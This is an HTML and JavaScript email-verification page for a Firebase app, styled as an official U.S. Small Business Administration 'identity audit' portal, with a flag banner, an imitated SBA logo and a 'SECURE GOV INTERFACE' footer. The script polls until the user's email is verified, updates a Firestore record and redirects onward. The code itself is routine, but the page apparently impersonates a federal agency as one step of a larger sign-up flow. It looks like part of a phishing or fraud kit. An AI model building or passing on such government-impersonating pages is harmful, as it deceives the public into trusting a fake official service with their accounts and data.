<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Verify Case</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
        
        .sba-logo-box { position: relative; display: inline-block; padding: 4px 6px; }
        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2.5px solid var(--sba-blue); border-left: 2.5px solid var(--sba-blue); border-right: 2.5px solid var(--sba-blue); }
        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2.5px; background: var(--sba-red); }

        .auth-card { background: white; border-top: 5px solid var(--sba-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius: 4px; }
        
        .btn-sba { background: var(--sba-blue); color: white; height: 55px; font-size: 13px; letter-spacing: 1.5px; font-weight: 900; text-transform: uppercase; border-radius: 4px; transition: 0.3s; cursor: pointer; }
        .btn-sba:disabled { opacity: 0.6; cursor: not-allowed; }

        .verify-pulse { animation: pulse-blue 2s infinite; border-radius: 50%; }
        @keyframes pulse-blue {
            0% { box-shadow: 0 0 0 0 rgba(0, 46, 109, 0.4); }
            70% { box-shadow: 0 0 0 15px rgba(0, 46, 109, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 46, 109, 0); }
        }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <div class="bg-[#efefef] py-2 px-4 flex items-center gap-2 border-b border-gray-200">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm" alt="U.S. Flag">
        <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Official Identity Audit</span>
    </div>

    <nav class="bg-white px-5 py-3 flex justify-center items-center border-b border-gray-100">
        <div class="flex items-center gap-2">
            <div class="sba-logo-box">
                <span class="text-xl font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
            </div>
            <p class="text-[10px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
        </div>
    </nav>

    <main class="flex-grow flex items-center justify-center p-5">
        <div class="w-full max-w-[420px]">
            <div class="auth-card p-8">
                <div class="mb-8 text-center">
                    <div class="w-20 h-20 bg-slate-50 text-[#002e6d] flex items-center justify-center mx-auto mb-6 border-2 border-[#002e6d] verify-pulse">
                        <i class="fas fa-envelope-open-text text-3xl"></i>
                    </div>
                    <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Account Audit</h2>
                    <p class="text-slate-400 text-[10px] font-black uppercase tracking-[0.2em] mt-2">Activation Link Dispatched</p>
                </div>

                <div class="mb-6 text-center bg-slate-50 p-5 border border-slate-200 rounded-lg">
                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">Verify Ownership Of:</p>
                    <span id="displayEmail" class="text-[#002e6d] text-base font-black break-all uppercase tracking-tight italic">Detecting...</span>
                </div>

                <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-black uppercase italic shadow-sm"></div>

                <div class="space-y-4">
                    <div class="p-5 bg-[#001a3d] border-l-4 border-sky-400">
                        <p class="text-white text-[11px] font-bold uppercase tracking-wider leading-relaxed">
                            <i class="fas fa-bolt text-sky-400 mr-2"></i> SYSTEM STATUS: <span id="statusText" class="text-sky-400">WAITING</span><br>
                            The portal will auto-advance once the link in your email is clicked.
                        </p>
                    </div>
                    
                    <button id="checkBtn" class="btn-sba w-full shadow-lg">
                        Manual Refresh Scan
                    </button>
                </div>

                <div class="mt-10 text-center border-t pt-6 border-slate-100">
                    <button id="resendBtn" class="text-[#cc0000] font-black text-[12px] uppercase tracking-widest hover:underline disabled:text-gray-400 disabled:no-underline">
                        <i class="fas fa-paper-plane mr-2"></i> Resend Security Link
                    </button>
                    <p id="timerDisplay" class="hidden text-[9px] text-slate-400 font-bold uppercase mt-2">Available in 60s</p>
                </div>
            </div>

            <button id="logoutBtn" class="w-full mt-10 text-slate-400 text-[10px] font-black uppercase tracking-[0.4em] active:text-red-600 transition-colors">
                <i class="fas fa-power-off mr-2"></i> Terminate Session
            </button>
        </div>
    </main>

    <footer class="py-6 text-center text-[10px] text-slate-400 font-bold uppercase tracking-[0.4em]">
        SECURE GOV INTERFACE © 2026 | NODE-V15
    </footer>

    <script type="module">
        import { auth, db } from './firebase-config.js';
        import { onAuthStateChanged, signOut, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const displayEmail = document.getElementById('displayEmail');
        const alertBox = document.getElementById('alertBox');
        const checkBtn = document.getElementById('checkBtn');
        const resendBtn = document.getElementById('resendBtn');
        const timerDisplay = document.getElementById('timerDisplay');
        const statusText = document.getElementById('statusText');

        let checkInterval;

        onAuthStateChanged(auth, async (user) => {
            if (!user) {
                window.location.href = "login.html";
            } else {
                displayEmail.innerText = user.email.toUpperCase();
                
                checkInterval = setInterval(async () => {
                    await user.reload();
                    if (auth.currentUser.emailVerified) {
                        clearInterval(checkInterval);
                        statusText.innerText = "VERIFIED";
                        await finalizeAudit(auth.currentUser);
                    }
                }, 4000);
            }
        });

        async function finalizeAudit(user) {
            try {
                await updateDoc(doc(db, "users", user.uid), {
                    isVerified: true,
                    accountStatus: "ACTIVE",
                    emailVerifiedAt: new Date().toISOString()
                });
                window.location.href = "welcome.html"; 
            } catch (e) { 
                window.location.href = "welcome.html"; 
            }
        }

        checkBtn.onclick = async () => {
            const user = auth.currentUser;
            if (!user) return;
            
            checkBtn.disabled = true;
            checkBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin mr-2"></i> SCANNING NODES...';
            
            await user.reload();
            if (user.emailVerified) {
                statusText.innerText = "VERIFIED";
                await finalizeAudit(user);
            } else {
                alertBox.innerText = "LINK STATUS: INACTIVE. PLEASE CHECK INBOX/SPAM.";
                alertBox.classList.remove('hidden');
                setTimeout(() => {
                    checkBtn.disabled = false;
                    checkBtn.innerText = 'Manual Refresh Scan';
                }, 2000);
            }
        };

        resendBtn.onclick = async () => {
            try {
                await sendEmailVerification(auth.currentUser);
                startResendTimer(60);
                alert("Security Link Dispatched successfully.");
            } catch (err) { 
                alert("SECURITY: Request blocked. Please wait."); 
            }
        };

        function startResendTimer(seconds) {
            resendBtn.disabled = true;
            timerDisplay.classList.remove('hidden');
            let timeLeft = seconds;
            const timer = setInterval(() => {
                timeLeft--;
                timerDisplay.innerText = `Available in ${timeLeft}s`;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    resendBtn.disabled = false;
                    timerDisplay.classList.add('hidden');
                }
            }, 1000);
        }

        document.getElementById('logoutBtn').onclick = () => {
            if (checkInterval) clearInterval(checkInterval);
            signOut(auth).then(() => { window.location.href = "login.html"; });
        };
    </script>
</body>
</html>
